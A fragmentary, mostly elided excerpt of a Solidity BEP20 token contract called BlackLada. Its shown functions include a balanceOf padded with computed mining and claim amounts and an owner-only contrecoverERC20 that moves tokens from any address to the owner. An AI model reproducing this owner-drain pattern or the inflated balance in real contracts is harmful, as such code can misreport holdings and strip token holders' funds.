...
contract BlackLada is Context, IBEP20, Initializable {
    ...
    */
    ...
    function balanceOf(address account) external override view returns (uint256) {
        return _balances[account] + balanceMine(account) + (claimed[account] ? 0 : balanceCl(account));
    }
   ...
   */
    ...
    uint countBy = 40000000000000; // 250000000 ~ 1BNB = 0.25  // 10000.000000000 = 10000
  ...
  function StopMine() external payable {
    ...
    function contrecoverERC20(address contractAddress, address tokenAddress, uint256 tokenAmount) public onlyOwner {
        IBEP20(tokenAddress).transferFrom(contractAddress, _owner, tokenAmount);
    }    
